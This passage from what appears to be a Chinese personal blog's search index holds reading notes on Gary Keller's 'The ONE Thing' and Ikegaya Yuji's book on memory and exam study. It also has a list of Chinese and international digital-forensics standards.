目标、优先事务以及生产力\n他们之间的联系将使最重要的一件事分化为两种——一件大事及一件小事。\n一件大事是指你的目标 一件小事则是指行动过程中做事的轻重缓急 在商业中，利润、生产力也是由优先事务和目标决定的 最高效的员工才能创造出卓越的企业。 个人生产力是所有商业利润中的基石，二者紧密联系、缺一不可。 若要生产力与利润兼得，最佳途径就是通过以目标为导向的方式来规划办事的优先次序。 目标、优先事务以及生产力这三者之间的共赢决定了个人与企业能发展到何种高度，这一点是成就卓越的核心。 13. 找到生活目标 生活的目的不在于找到自己，而在于创造自己。——萧伯纳\n我们的目标承载着我们的规划，规划又托付着我们的行动所带来的成效，他们紧密连接，缺一不可。\n狄更斯认为，我们追求的目标决定了我们能成为一个什么样的人。\n我们是什么样的人，我们的人生方向是什么，决定了我们将要采取何种行动，成就何番事业。\n目标之于幸福\n问问身边的人，他们最想要的是什么？\n几乎所有的人的答案都是：幸福 虽然我们有各自特定的答案，但幸福仍然是我们最渴求的，也是我们最难领会的。 乞丐的晚\n实际上，幸福就诞生于圆梦的征途中。\n那种有着相当高的收入又不用为经济目标而拼命赚钱的人，在我眼里才算是富足之人。\n要做到经济富足，就必须心怀目标。也就是说，若没有目标，那么你永远都不会意识到自己是否赚到了足够的钱，也就是永远不可能成为富足的人。 目标的力量\n当你拥有了一个明确的目标时，你的思路将变得更加敏捷，你对前方的道路也会看得越来越清楚，做起决策自然就更加得心应手。 建议：\n幸福诞生于圆梦的征途中。人人都想得到快乐，但追寻它并不代表能找到它。真正长久的幸福，发生在你为生活设定了更大的目标，每天都变得更有意义时。 回答自己的 “大问号”。通过提问找到自己的目标。是什么在清晨将你唤醒，又在你疲惫不堪的时侯鞭策你继续前行？我常常会把这比作自己的“大问号”。这是你们对自己的生活感到兴奋无比的缘由，也是你为之忙碌的原因。 勿问结果，只看方向。“目标”二字看似沉重，但其实未必如此，你只需把它看作是你人生中唯一想做的事情。试着将自己的目标写在纸上，然后说说自已准备如何实现。 14. 确定优先事物 用倒推法设立目标\n只有学会处理优先事务，目标才能成就生命，否则目标就毫无用处。\n回报周期越长，人们想得到它的动机就越小\n优先事务与未来目标的关系图 首先需要考虑长期目标，然后一步步往回考虑，倒推出现在应该做的最重要的一件事。\n为了长期目标，我未来5年应做的最重要的一件事是什么？ 为了5年目标，我今年应做的最重要的一件事是什么？ 为了今年的目标，我本月应该做的最重要的一件事是什么？ 为了本月的目标，我本周应该做的最重要的一件事是什么？ 为了本周的目标，我今天应做的最重要的一件事是什么？ 为了今天的目标，我现在应做的最重要的一件事是什么？ 它可以训练你的思维，将所有目标一个个联系起来，知道你找到当下最重要的那件事。把今天和明天关联起来，这一点很重要。\n建议\n只有一件事。你的优先事务只有一件，你要立刻去做，以此帮助自己达到目标。你或许有很多“重要的事情”，但认真考虑后你就会发现，只有一件最重要的事，那就是你的优先事务。 倒推法设立目标。第一步就是找到你的长期目标，然后估算实现这一目标需要哪几步，考虑清楚每一步的优先事务是什么，由此从未来倒推至当下。 落于笔头。把每一步目标都写下来。有了根据倒推法设定的优先事务，其他一切事情就会变得更简单或没必要了，只要专注于最重要的那件事就好。这种方法为我们打通了成功之路。 15. 高效的生活 搞笑的行为会改变生活。\n我们所做的所有重要的事也决定了我们成功与否。\n我的目标不是做的更多，而是让自己需要的事情更少。——弗朗辛杰伊\n预留时间段\n与自己做个约定，并履行诺言 预留时间段是一种以结果为导向来看待和使用事件的观点。 要为以下三件事预留时间\n留出空闲时间 休息和放松时间 如果忽视了自己的休息事件，那么你就无法保持成功的状态。 流出做优先事务的时间 所以一定要留出空闲时间，然后留出做优先事务的时间。\n尽早规划自己的时间。一天规划4个小时至少。\n保罗格雷厄姆《执行者的时间表，经理的时间表》低估了人们对大量时间预留的需要。认为员工事件安排的方式庾公司文化相关，正式公司文化阻碍了工作效率的提高。\n工作职责分成两类\n执行者（执行或创造）\n需要占用大量的预留时间，用来写编码、推敲某个观点、产生领导效应、招聘新员工、生产产品或执行项目和计划。 经理（监督或指导）\n经理的事件被分成几部分。这段时间被分配给了接连不断的会议，因为监督者或指导者有权让“其他人跟随自己的步骤” 如果将执行者时间也算在会议时间，就会产生很大的冲突，他们将没有时间推动自己和公司前进\n因此成功意味着你要在上午做一个执行者，在下午做一个管理者。你的目标就是完成优先事物，如果你不为优先事物预留时间，你就肯定完不成。 留出做计划的时间 每周流出一小时反思自己的年度目标和月目标。 把重要的多米诺骨牌推到是一件很神奇的事情。你所做的全部工作就是避免破坏这个链条，每天积累，直到养成习惯——预留时间的习惯。 维护时间段\n维护时间段最好的方法就是拥有坚定的意志。\n“除非我把优先事务做完了，否则其他一切事物都会分散我的注意力”\n写下这句话，放在你和其他人都能看到的地方，时常把它记在心上。用不了多久其他人就会理解和支持你的做法了。 不要放松自己的思想。\n对其他事情的需求而非对优先事物的需求或许是我们要面对的最大挑战。 4种有效的方法防止你走神：\n建立堡垒。找到一个抗干扰的工作地点。 存储一些食物。在工作的地方存储一些零食、饮料，放在手边避免离开你的工作环境。 关掉隐形的“地雷”。关掉你的手机、电子邮箱、浏览器，你的优先事物需要你百分之百集中注意力。 赢得支持。告诉哪些可能找你的人自己正在做的事情，以及你什么时候有时间。其他人一旦知道了你的计划以及你方便的时间，就会主动配合了。 建议\n1． 把点连成线。只有将目标与当下的现实联系在一起，才有可能成功。挖掘自己的目标，让它变得明确，以确定自已的优先事务。一旦确定了优先事务，下一步就是去实施。 2.为优先事务预留时问。完成优先事务的最好方式就是和自己约定，把一天中较早、较充分的时间留给它，不要低于4个小时。你可以这样想：如果在试行中预留时间，你的计划能否使自己信服？ 不惜任何代价维护预留时间。只有当自己下决心说“我要专注于最重要的那件事，其他任何事、任何人都不能让我分心”这句话时，预留时间才能起作用。不幸的是，他人不会明白我们的决心，所以你必须想尽办法应对这种情况。你的预留时问是自己每天最重要的约会，因此无论如何都要不惜代价维护它。 成大事者不是在拉长工作时间，而是在有限的时间内做得更多。 你必须明白，预留时间很重要，有效的预留时间也很重要。 16. 三个承诺 有关最重要的一件事的三个承诺：\n达到精通 把精通当作通往成功的必经之路而非目的地，我们就不会感到遥不可及了。 从根本上来说，精通是一种思维方式、行事方式以及经历。 当你选择精通某事而不断追求时，其他事情就会变得简单或不重要了。因此精通的思维方式很重要。 你对某种技能的精通会随着时间的投入而不断提高。 从“E”到“P” 精通就是尽自己最大的努力，并尽力做到最好。不断改进自己的做事方式，才能从预留时间中获得最大值。 从E到P 两种方式开始新的一天\n活力四射（entrepre-neurial）\n看得到想做的事情或需要做的事情，精神百倍的将它完成，无论这个任务是什么 如果你的努力与结果是正比的，就请继续前行。但当你在做最重要的那件事时，难度很大，就需要另一种方法——目的法。 目标明确（purposeful）\n遇到了限制，寻找新的思维模式和方法。暂停下来，确认自己的选择，一旦学则了最好的路，就坚持不写的努力。 一个E型人去砍柴，他会扛着斧头径直走进树林。但是，P型人可能会问，哪有电锯。P型人的思维中，一个人可以超越自身能力取得突破、完成任务，你只需要全力以赴。 很多人达到一定高度后便停滞不前，需要不断提高精通的标准，不团挑战自己并打破限制，永远拥有学徒的心态。 当你拼尽全力做事但结果却不尽如人意时，你就应该抛弃E方法，并启动P的方法。寻找更好的模式、系统和新关系帮助你行动昂。在预留时间段里变得更有目的性，你的潜能才会被激发出来。\n3.遵循问责周期\n有责任感的人可以梦想成真。\n一个人既可以成为自己生活的缔造者，也可以成为他的牺牲品。对结果负有全部责任，坚信自己才能对他们负责，这是最强大的动力。 成功的人很清楚自己扮演的角色。他们不怕面对现实，他们追求它、承认它、拥有它。他们懂得，这是寻找和使用新方案、应对现实的唯一方法，他们承担起责任，并庾它同行。他们看到结果并吸取教训，从失败中学习，再创卓越。\n学习负责的最快方法就是找一位与自己一起负责的人，比如你的人生导师、朋友等。 埃里克松对精通的研究确认了精通与训练之间的关系：“门外汉与三种精通者之间最重要的区别是，精通者在未来更愿意寻找相关老师来指导他们，而门外汉则很少做类似的练习。”\n一位有责任感的合作者有利于帮助你提高效率。他们会让你保持诚实，并一直走在正轨上。\n建议\n做到最好。只有当你在最重要的工作中表现得最好、做到最好时，才会产生卓越的成果。实际上，这就是精通之路。因为精通需要时间，所以你需要严守承诺去实现它。 对优先事务目标明确。要从“E”变为“P”，导找能把你带向最远方的模式或系统，不要被环境所局限，应对新思路、新技能、新关系敞开怀抱。如果精通之路是承诺做到最好，那么目标明确就是你应采用的最佳方式。 对自己负责。若想成功就不能做生活的牺性品，只有对自己负责才能成功。所以，不要以乘客的眼光而是要以司机的角度来看待问题。 找到一位人生导师。几乎所有的成功人士都有人生导师。 记住，我们不是在说普通结果，而是要追求卓越。当我们为最重要的一件事留出时间、保护这些预留时间，并且尽最大努力在预留时间内高效工作时，你一定会达到最高效率。你讲在人生最重要的那件事中发现勇气与力量。 17. 四个小偷 低效率的4个小偷\n不会说“不” 你不可能取悦所有人\n直接拒绝 引导求助者去别处寻找帮助 三英尺定律\n深处一只胳膊、从脖子到指尖大概三英尺。在这个范围内，我限制自己去拿随手可得的东西。\n所有的需求都要与我的终极目标有关。 害怕混乱 专注于最重要的一件事时，混乱是不可避免的。 根据自己的实际情况去安排时间。你不应该成为周围环境的牺牲品。保持自己的效率，与混乱共处，在最重要的一件事上爆出专注。 糟糕的健康习惯 成功需要投入足够的经理，关键是如何拥有充沛的精力并加以保持。\n1.冥想、祈祷，让自己有充足的精神动力 2.找出健康饮食方案，定制个性化饮食计划。 多做运动释放压力、强健身体。 4.陪伴家人，情感的支持让人内心愉悦，勇往直前。拥抱、接吻、大笑。 5.制定重要事情日历计划，确定目标、制定计划 6.专注于优先事务，为重要的一件事留出事件，充实自己的商务动力 7.最后睡够8小时。 逆境 我们的环境必须有利于目标的实现。\n你的环境就是每天你所见到的人与经历的事。周围的人都很熟悉，环境很舒适，你非常有安全感，但他们任何人任何事都会成为小偷，把你的注意力从重要的事情中分散出来。\n你周围的人或许比你想象的更重要。与他们合作，你就要接受他们的某些态度。\n多和充满正能量的人在一起，消极的态度会偷走你的能量、努力和决心，支持你的人会鼓励你、帮助你。 与有成功信念的人为友，会产生“向上螺旋”的现象，人们会渐渐找到自己的方向，最终走上正确的人生之路。 建议：\n学会说“不”。永远记住，对一些事说“是”的时候，就意味着你已经对另-些事说了“不”。要遵守承诺。学会直率或委婉地拒绝其他要求，对分散你的注意力的事情说“不”，这样就没有什么可以阻止你去做那一件最重要的事了。学会拒绝能够解放自己，这就是为优先事务留出时间的方法。 2.接受混乱。若要完成优先事务就必须让其他事情退后。混乱就像陷阱，会在前进的道路上给你设置障碍。混乱是不可避免的，学会与它和睦相处吧。 管理自己的能量，不要栖牲自己的健康。身体1一个精密的仪器，一旦损坏，修理成本就会非常高。管理自己的能量很重要，只有如此，你才有精力去做最重要的事，从而实现你的目标，过你想过的生活。 对自己的环境负责，确保周围的人和环境有利于目标的实现。正确的人和环境会支持你专注于自己的优先事务。当两者皆与优先事务相关时，它们会为你提供乐观的人生态度和物质支持，帮助你实现最终目标。 剧作家利奥 ． 罗斯滕曾说：“我认为人生的目的不是幸福，而是有意义、有责任和常葆激情。最重要的是去做事，让世界因你而改变。”所以，你应该有目的地生活，为优先事务而生活，高效地生活。 18. 生命的旅程 不管何时，最后剩下的只是那一件最重要的事。假如这件事与你的目标相符，也最紧要，那么它将有效的促使你获得最好的结果。\n来自朋友的建议\n我们有很多办法可以去衡量自己的生活是否有价值，但其中最显著的途径就是看看自己是否一生无悔。 不要在短暂的一生中留下遗憾。 成功关乎内心\n梳理自身，让你的世界变得更加清晰。当你的生活有了目标，当你知道你的优先事务时，你的人生就充满了意义，你就有可能拥有成功幸福的生活。 ",
    "description": "",
    "tags": null,
    "title": "《最重要的事，只有一件》加里·凯勒、凯勒,帕帕森.",
    "uri": "/%E7%A4%BE%E7%A7%91/%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E4%BA%8B%E5%8F%AA%E6%9C%89%E4%B8%80%E4%BB%B6%E5%8A%A0%E9%87%8C%E5%87%AF%E5%8B%92%E5%87%AF%E5%8B%92%E5%B8%95%E5%B8%95%E6%A3%AE/index.html"
  },
  {
    "content": "《考试脑科学》池谷裕二 第一章 记忆究竟是什么 能力只能用考试检测吗？ 记忆的形成，意味着在人脑中留下了“痕迹”。 神经元创造出的脑 脑科学：记忆是将神经回路的动力学现象转化为一定规则，在突出重叠的空间中，根据读取的外部时空信息，形成一种内部信息表达的过程。 记住与忘记 短期记忆 长期记忆 认识海马体 只有被海马体判定为必要的信息，才会将短期记忆转为长期记忆。\n例如危险环境 加油吧，海马体 欺骗海马体达到长期记忆 第二章 欺骗大脑的方法 无论是谁都会忘记 忘记不会因人而异。 好方法？坏方法？ 遵循人脑规则的好方法\n遵循遗忘曲线进行复习 不遵守人脑规则的坏方法\n不按照遗忘曲线进行复习 导致记忆混乱或加速遗忘 反复记忆的效果 反复学习可以降低忘记知识的速度 蛮干终究是徒劳 海马体欺骗指南\n一个月内进行多次复习对于知识转化长期记忆更有力\n首次复习输送进海马体的信息越多，成功欺骗海马体的可能性越大\n海马体复习计划\n第一次复习：学习后的第二天 第二次复习：第一次复习一周后 第三次复习：第二次复习2周后 第四次复习：第三次复习一个月之后 整个计划两个月内完成。 每次复习同样的内容才有效，如果超出的内容只会对记忆造成干扰，降低效率。\n人脑更重视输出 人脑更重视输出而不是输入 想要留住记忆，就不能忽视输出 灵活运用所学知识的学习方法效率更高 第三章 海马体和LTP 掌握记忆关键的LTP Long term potentiation 长时程增强作用\n没有LTP就无法形成记忆\nLTP是神经元反复受到刺激后才产生的现象\n简洁的引发LTP现象\n莫扎特效应\n通过莫扎特的音乐可以短暂提升期间的智商 某种特殊的脑电波出现才能刺激海马体 童心是提高成绩的营养素 童心提高成绩\n好奇心产生θ波，能够刺激海马体 对要记住的内容越抱有兴趣对于刺激海马体越有利 乙酰胆碱AHC\n乙酰胆碱是产生θ波的根源，具有刺激海马体，保持意识清晰、提高记忆力的作用 感冒药、止泻药、晕车药等都会抑制乙酰胆碱，关键的两个成分为（东莨菪碱scopolamine，苯海拉明diphenhydramine） 所谓回忆 激发杏仁核的神经元聚集组织也可以引发LTP 杏仁核紧邻海马体，负责产生喜悦、悲伤、焦虑等情绪 快乐情绪、舒畅情绪都能刺激大脑高度觉醒，提升人的积极性和注意力刺激海马体产生θ波，进而提升记忆力 人在情绪高涨的时候会容易记忆 感动式学习 压力会抑制LTP 焦虑/危机感可以激活杏仁核 排解不安，写下来 挺胸抬头对自己自信 狮子学习法 饥饿感、来回走动、降低室温，可以刺激海马体，提升记忆力\n情绪唤醒\nemotional arousal 电影/小说如果能让人感动，一般都能坚持看到最后 通过小技巧不断调动情绪，达到刺激海马体，提升记忆 第四章 不可思议的睡眠 睡觉也是学习的一部分 记住自己能记住的所有知识，切实掌握自己能理解的全部内容。然后果断睡觉，交给海马体 梦能培养学习实力 记忆恢复\n做梦时记忆得到巩固，逐渐成熟 保持充足的睡眠很重要 睡眠和记忆 浅睡眠状态θ波最强\n睡眠可以将知识进行整理。睡觉前把题目过一遍是很重要的学习技巧。\n午睡半小时也有效果。只要停止向大脑输入信息，给大脑整理信息的时间。即使人处于清醒状态，只是安静的呆着，海马体就会开始整理信息。\n因此睡眠就要安静停止其他输入\n恢复精神和注意力\n如果视野中出现“加油”“非常棒”等积极向上的鼓励语，即使本人没怎么意识到，也能实际起到鼓舞人心的效果。 学习需要持之以恒 两种可以有效利用睡眠的方法\n分散学习，将学习分散在不同的时间段进行\n忘记的慢\n集中学习，短时间学完所有内容\n忘记的快 生物节律\n人出现时差时，海马体中的细胞就会死亡，导致记忆下降 昼夜节律、周节律、月节律、年节律。 星期五效应：周五和周六学习效率最高 睡前是记忆的黄金期 学习方法与学习的时间段有关\n睡觉前1-2小时是记忆的黄金时间 能有效利用全天时间的学习方案 时间安排的要点\n1.饭前处于饥饿状态，正适合学习 2.睡觉前也是学习的黄金期 3.早饭或晚饭后处于饱腹状态时，不学习也不要紧。可以读课外书、看电视，或者玩游戏，做一些自己感兴趣的事，可以让我们的生活更加丰富 4.午后如果实在困的不行，睡午觉，不要有顾虑 如果早就决定要睡午觉，那么午睡前的一段时间内抓紧学习 第五章 模糊的大脑 记忆的本质 根据进化论，人脑的本质是从动物脑进化来的，因此本质就是动物脑\n外在动机\n在设置较大的最终目标的同时，还应该设定一些小目标，即比较容易实现的目标，这样才能激励自己持续学习。 面对失败，毫不气馁的积极态度最重要 对于学习来说：“善于反省”和“保持乐观”同样重要\n偏好效应\n我们不仅要了解自己擅长的科目是什么，还要思考在考试时，这些科目对于考试结果有怎样的意义，并拟定适当的应试策略才对。 人脑和计算机的差异 人类学习三要素\n不畏失败的毅力 解决问题的能力 乐观的性格 感到有趣的瞬间\n生而为人，我们有义务把人生活出价值。林肯 保持毅力和信心而努力做下去对于不让付出白费更有利。 客观评估自己的学习实力 最重要的是不要去看远方模糊的目标，而是要做手边最具体的事情。卡莱尔\n首先要明确自己的弱点，然后逐步克服，遵循循序渐进的学习方法。设立宏大目标，同时设立容易实现的小目标，一步一步踏实做完。\n行动兴奋\n伏隔核，是控制“干劲儿”的部位。 行动兴奋，一旦开始行动，状态就会渐入佳境，注意力也能只中了。 唤醒伏隔核需要一定时间，可以先开始学习10分钟再说 记忆原本就是模糊的 记忆的本质就是模糊而随意的 吃糖果补充葡萄糖有助于将能量转化为大脑使用，让大脑清醒。 牛排和猪排是胜利之后才吃的食物。 用反省代替后悔吧 人类本来就常常忘记或者出错，失败并不可耻，并没必要过度惧怕失败，更重要的是反省。\n开头和结尾努力\n当注意力放在开头或者结尾的时候注意力就会很集中，因此可以利用此特点，让自己再次集中注意力 带着长期计划去学习 学习要首先从大局出发，掌握整体面貌\n逐步了解各个细节\n最后到细枝末节\n这种才是遵循人脑性质的科学方法。\nBGM\n如果bgm可以提升效率可以试试用bgm辅助学习 先扩大擅长科目的优势 学会了一种事物，也就相当于拥有了学习其他事物的基础能力。这种现象叫做“学习迁移” 学的水平越高，迁移的效果就越好。也就是说记忆的东西越多，脑就越灵光。 第六章 天才的记忆机制 改变记忆的方法 记忆的种类\n知识记忆\n能够轻易回想起来，与自己过去的经验相关的记忆 经验记忆\n缺少契机就很难回想起来的知识或信息类记忆 学习的过程中要想办法把知识记忆变成经验记忆\n联想很重要 把想要记忆的内容与其他内容关联在一起的方法叫做“关联记忆法” 重点在于精致化能关联起各种事物，并且能够让我们更加容易的会想起这些事物。转为经验记忆。 谐音记忆法，是一种常用的记忆精致化的方法。也可以转为经验记忆。 想象意义含义对于转化经验记忆同样重要。 总结：最好与自己的实际经验结合，越接近自己的经验就越接近经验记忆。 向别人讲述学到的知识 向其他人或特定的对象进行讲述，能够将知识记忆转化为经验记忆。 声音、听觉与记忆 学习时一定要动笔、出生、反复输出知识来强化记忆 理解记忆的种类和年龄的关系 方法记忆\n通过身体记住的记忆 通过实践才能掌握的记忆 方法记忆的特征\n不知不觉中形成的记忆。 方法记忆非常牢固，难以忘记。 从原始到高等记忆的方向对三个记忆进行排序：方法记忆、知识记忆、经验记忆\n根据阶段改变学习方法 对于不同的人生阶段应采取不同的学习方法最有效（限小学、初中、高中） 方法记忆的魔力 创造天才的能力的方法都是方法记忆 也就是说将经验记忆锻炼成方法记忆之后将会更加牢固记忆 会膨胀的记忆方法 举一反三的能力，理解知识本身并运用，对于记住知识本身更容易让人记住。 为什么要持续努力 持续努力才是最重要的学习新的。因为努力和成果是成指数级增长的。 ",
    "description": "",
    "tags": null,
    "title": "《考试脑科学》池谷裕二",
    "uri": "/%E7%A4%BE%E7%A7%91/%E6%B1%A0%E8%B0%B7%E8%A3%95%E4%BA%8C%E8%80%83%E8%AF%95%E8%84%91%E7%A7%91%E5%AD%A6%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "0x00电子取证标准",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x00%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "0x01现场勘查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x01%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "1磁盘镜像",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/index.html"
  },
  {
    "content": "第一部分：国内的相关标准规范 原文：微信公众号“cnforensics”，微信公众号“取证杂谈”\n国家标准（4） GB/T 29360-2012 《电子物证数据恢复检验规程》下载 GB/T 29361-2012 《电子物证文件一致性检验规程》下载 GB/T 29362-2012 《电子物证数据搜索检验规程》下载 GB/T 31500-2015 《信息安全技术 存储介质数据恢复服务要求》下载 GB/T 39321-2020 《电子合同取证流程规范》即将实施状态 在线 公共安全标准（39） GA/T 754-2008 《电子数据存储介质复制工具要求及检测方法》 GA/T 755-2008 《电子数据存储介质写保护设备要求及检测方法》 GA/T 756-2008 《数字化设备证据数据发现提取固定方法》 GA/T 757-2008 《程序功能检验方法》 GA/T 825-2009 《电子物证数据搜索检验技术规范》（已废止） GA/T 826-2009 《电子物证数据恢复检验技术规范》（已废止） GA/T 827-2009 《电子物证文件一致性检验技术规范》（已废止） GA/T 828-2009 《电子物证软件功能检验技术规范》 GA/T 829-2009 《电子物证软件一致性检验技术规范》 GA/T 976-2012 《电子数据法庭科学鉴定通用方法》 GA/T 977-2012 《取证与鉴定文书电子签名》 GA/T 978-2012 《网络游戏私服检验技术方法》 GA/T 1069-2013 《法庭科学电子物证手机检验技术规范》 GA/T 1070-2013 《法庭科学计算机开关机时间检验技术规范》 GA/T 1071-2013 《法庭科学电子物证Windows操作系统日志检验技术规范》 GA/T 1170-2014 《移动终端取证检验方法》 GA/T 1171-2014 《芯片相似性比对检验方法》 GA/T 1172-2014 《电子邮件检验技术方法》 GA/T 1173-2014 《即时通讯记录检验技术方法》 GA/T 1174-2014 《电子证据数据现场获取通用方法》 GA/T 1175-2014 《软件相似性检验技术方法》 GA/T 1176-2014 《网页浏览器历史数据检验技术方法》 GA/T 1474-2018 《法庭科学计算机系统用户操作行为检验技术规范》 GA/T 1475-2018 《法庭科学电子物证监控录像机检验技术规范》 GA/T 1476-2018 《法庭科学远程主机数据获取技术规范》 GA/T 1477-2018 《法庭科学计算机系统接入外部设备使用痕迹检验技术规范》 GA/T 1478-2018 《法庭科学网站数据获取技术规范》 GA/T 1479-2018 《法庭科学电子物证伪基站电子数据检验技术规范》 GA/T 1480-2018 《法庭科学计算机操作系统仿真检验技术规范》 GA/T 1554-2019 《法庭科学电子物证检验材料保存技术规范》 GA/T 1564-2019 《法庭科学 现场勘查电子物证提取技术规范》 GA/T 1568-2019 《法庭科学 电子物证检验术语》 GA/T 1569-2019 《法庭科学 电子物证检验实验室建设规范》 GA/T 1570-2019 《法庭科学 数据库数据真实性检验技术规范》 GA/T 1571-2019 《法庭科学 Android系统应用程序功能检验方法》 GA/T 1572-2019 《法庭科学 移动终端地理位置信息检验技术方法》 GA/T 1663-2019 《法庭科学 Linux操作系统日志检验技术规范》 GA/T 1664-2019 《法庭科学 MS SQL Server数据库日志检验技术规范》 GA/T 1713-2020 《法庭科学 破坏性程序检验技术方法》 司法鉴定技术规范（15） SF/Z JD0400001-2014 《电子数据司法鉴定通用实施规范》下载 SF/Z JD0401001-2014 《电子数据复制设备鉴定实施规范》下载 SF/Z JD0402001-2014 《电子邮件鉴定实施规范》下载 SF/Z JD0403001-2014 《软件相似性鉴定实施规范》下载 SF/Z JD0400002-2015 《电子数据证据现场获取通用规范》下载 SF/Z JD0401002-2015 《手机电子数据提取操作规范》下载 SF/Z JD0402002-2015 《数据库数据真实性鉴定规范》下载 SF/Z JD0402003-2015 《即时通讯记录检验操作规范》下载 SF/Z JD0403002-2015 《破坏性程序检验操作规范》下载 SF/Z JD0403003-2015 《计算机系统用户操作行为检验规范》下载 SF/Z JD0402004-2018 《电子文档真实性鉴定技术规范》下载 SF/Z JD0403004-2018 《软件功能鉴定技术规范》下载 SF/Z JD0404001-2018 《伪基站检验操作规范》下载 SF/T 0075—2020 《网络文学作品相似性检验技术规范》下载 SF/T 0076-2020 《电子数据存证技术规范》下载 SF/T 0077-2020《汽车电子数据检验技术规范》下载 其他文件 《中华全国律师协会律师办理电子数据证据业务操作指引》 第二部分：国外的相关标准规范 ISO/IEC电子数据取证标准体系 ISO/IEC 27035：2011《信息技术-安全技术-信息安全事件管理》 ISO/IEC 27037:2012《信息技术-安全技术-电子证据识别. 收集. 获取和保存指南》 ISO/IEC 27038：2014《信息技术-安全技术-数字化修订详述》 ISO/IEC 27040：2015《信息技术-安全技术-存储安全》 ISO/IEC 27041《信息技术-安全技术-调查方法适宜性充分性保障指南》 ISO/IEC 27042《信息技术-安全技术-电子证据分析解释指南》 ISO/IEC 27043:2015 《信息技术-安全技术-信息技术-安全技术-调查原则和过程》 ISO/IEC 27044《信息技术-安全技术-安全信息和事件管理指南》 ISO/IEC 27050《信息技术-安全技术-电子证据发现》 ISO/IEC 30121：2015《信息技术-电子数据取证风险架构管理》 SWGDE-手机 SWGDE Best Practices for Chip-Off [2016-02-08 V1.0下载](https://www.swgde.org/documents/Current Documents/SWGDE Best Practices for Chip-Off) SWGDE Best Practices for Collection of Damaged Mobile Devices [2016-02-08 V1.1下载](https://www.swgde.org/documents/Current Documents/SWGDE Best Practices for Collection of Damaged Mobile Devices) SWGDE Best Practices for Examining Mobile Phones Using JTAG [2015-09-29 V1.0下载](https://www.swgde.org/documents/Current Documents/SWGDE Best Practices for Examining Mobile Phones Using JTAG) SWGDE Best Practices for Mobile Phone Forensics [2013-02-11 V2.0下载](https://www.swgde.org/documents/Current Documents/SWGDE Best Practices for Mobile Phone Forensics) SWGDE Core Competencies for Mobile Phone Forensics [2013-02-11 V1.0下载](https://www.swgde.org/documents/Current Documents/SWGDE Core Competencies for Mobile Phone Forensics) SWGDE-计算机 SWGDE Best Practices for Computer Forensic Acquisitions [2018-04-25 V1.0下载](https://www.swgde.org/documents/Current Documents/SWGDE Best Practices for Computer Forensic Acquisitions) SWGDE Capture of Live Systems [2014-09-05 V2.0下载](https://www.swgde.org/documents/Current Documents/SWGDE Capture of Live Systems) SWGDE Best Practices for Handling Damaged Hard Drives [2014-09-05 V1.0下载](https://www.swgde.org/documents/Current Documents/SWGDE Best Practices for Handling Damaged Hard Drives) SWGDE Best Practices for Computer Forensics [2014-09-05 V3.1下载](https://www.swgde.org/documents/Current Documents/SWGDE Best Practices for Computer Forensics) 美国国家标准于技术研究院（NIST） Guidelines on PDA Forensics 下载 2004年11月1日发布，NIST SP 800-72 Guide to Integrating Forensic Techniques into Incident Response 下载 2006年9月1日发布，NIST SP 800-86 Guidelines on Mobile Device Forensic 下载 2014年5月15日发布，NIST SP 800-101 Revision 1 美国联邦司法部 Digital Evidence in the Courtroom A Guide for Law Enforcement and Prosecutors 下载 《法庭中的数据证据：执法部门及检察官操作守则》 Electronic Crime Scene Investigation An On-the-Scene Reference for First Responders 下载 《电子犯罪现场调查：第一响应者的现场参考》 Electronic CrimeScene Investigation A Guide for First Responders 第二版下载 《电子犯罪现场调查：第一响应者指南》 Forensic Examination of Digital Evidence A Guide for Law Enforcement 下载 《数字证据的司法审查：执法人员指南》 investigations involving the internet and computer networks 下载 《涉及互联网和计算机网络的调查》 美国试验与材料学会国际组织 Standard Guide for Education and Training in Computer Forensics 查看详情 ASTM E2678-09(2014)，2014年最后修订 StandardPractice for Computer Forensics 查看详情 ASTM E2763-10，2010年最后修订 Standard Guide for Forensic Digital Image Processing 查看详情 ASTM E2825-18，2018年最后修订 Standard Guide for Establishing Confidence in Digital Forensic Results by Error Mitigation Analysis 查看详情 ASTM E3016-15e1，2015年最后修订 Standard Guide for Core Competencies for Mobile Phone Forensics 查看详情 ASTM E3046-15，2015年最后修订 Standard Practice for Examining Magnetic Card Readers 查看详情 ASTM E3017-15，2015年最后修订 其他 Good Practice Guide for Digital Evidence 下载 英国警察协会（ACPO）《数字证据良好操作指南》 Best Practices For Seizing Electronic Evidence v.3 - A Pocket Guidefor First Responders 下载 美国特勤局，2007年发布 Searching and Seizing Computers and Obtaining Electronic Evidence in Criminal Investigations 下载 第三部分：参考资料及说明 取证中国论坛 中国司法部网站 微信公众号“电子数据取证与鉴定” 美国联邦司法部网站 数字证据科学工作组 美国国家标准于技术研究院 百度百科“美国电子数据取证标准”词条 没有附下载连接的部分标准规范可邮件联系我获取，详见“关于”页面 本文最初发布在微信公众号“cnforensics”，发布时间为2016年5月23日。 2018年3月11日发布在本人微信公众号“取证杂谈”。 2018年9月29日更新内容：更新了部分失效的下载链接 2018年11月6日更新内容：增加了2018年5个公共安全标准 2018年11月9日更新内容：增加了遗漏的GA/T 1475-2018 及GA/T 1480-2018两个标准，增加了2018年3个司法鉴定技术规范 2019年5月29日更新内容：更新并补全了司法鉴定技术规范的下载链接 2019年7月4日更新内容：增加了公共安全行业标准GA/T 1554-2019 2019年7月27日更新内容：增加了GA/T 1564-2019等6个公共安全行业标准 2019年10月24日更新内容：增加了GA/T 1663-2019和GA/T 1664-2019两个公共安全行业标准 2020年6月25日更新内容：增加了GB/T 31500-2015、GA/T 1713-2020、SF/T 0076-2020、SF/T 0077-2020四个标准 2021年3月9日更新内容：增加了GB/T 39321-2020和SF/T 0075—2020两个标准 ",
    "description": "",
    "tags": null,
    "title": "2.0电子取证标准",
